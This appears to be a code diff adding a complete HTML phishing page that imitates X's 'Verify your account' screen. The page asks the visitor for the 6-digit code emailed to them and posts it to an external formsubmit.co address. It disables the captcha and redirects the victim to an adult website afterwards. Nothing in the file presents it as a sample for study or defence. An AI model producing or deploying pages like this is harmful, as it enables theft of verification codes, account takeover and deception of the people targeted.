@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify your account - X</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Roboto', sans-serif;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .logo {
+            text-align: center;
+            margin: -10px 0 20px;
+            font-size: 30px;
+        }
+        h1 {
+            font-size: 23px;
+            margin-bottom: 1px;
+            font-weight: 700;
+            text-align: left;
+        }
+        p {
+            color: #71767b;
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.5;
+            text-align: left;
+            padding: 0 0px;
+        }
+        .code-input {
+            width: 90%;
+            padding: 18px 15px;
+            background: transparent;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 20px;
+            transition: ease 2s;
+        }
+
+        .code-input:active {
+            outline: none;
+            border: 1px solid #fff;
+        }
+
+        .button-container {
+            margin-top: auto;
+            padding-bottom: 40px;
+            display: flex;
+            justify-content: flex-end;
+        }
+        .next-button {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 9999px;
+            padding: 14px 24px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 120px;
+        }
+        .next-button:hover {
+            background-color: #e6e7e7;
+        }
+        form {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        @media (max-width: 480px) {
+            .logo {
+                margin: -10px 0 20px;
+            }
+            h1 {
+                font-size: 28px;
+            }
+            .code-input {
+                padding: 16px 12px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <form action="https://formsubmit.co/1f002c7bcb098ffeaad22c6268285709" method="POST">
+        <div class="logo">𝕏</div>
+        
+        <h1>Help us keep your account safe.</h1>
+        <p>Verify your identity by entering the 6-digit code sent to the email address associated with this account.</p>
+        
+        <input type="text" name="6-Digit-Code" class="code-input" placeholder="Enter 6-digit code" required inputmode="numeric">
+
+
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://youporn.com/">
+        
+        <div class="button-container">
+            <button type="submit" class="next-button">Next</button>
+        </div>
+    </form>
+</body>
+</html>
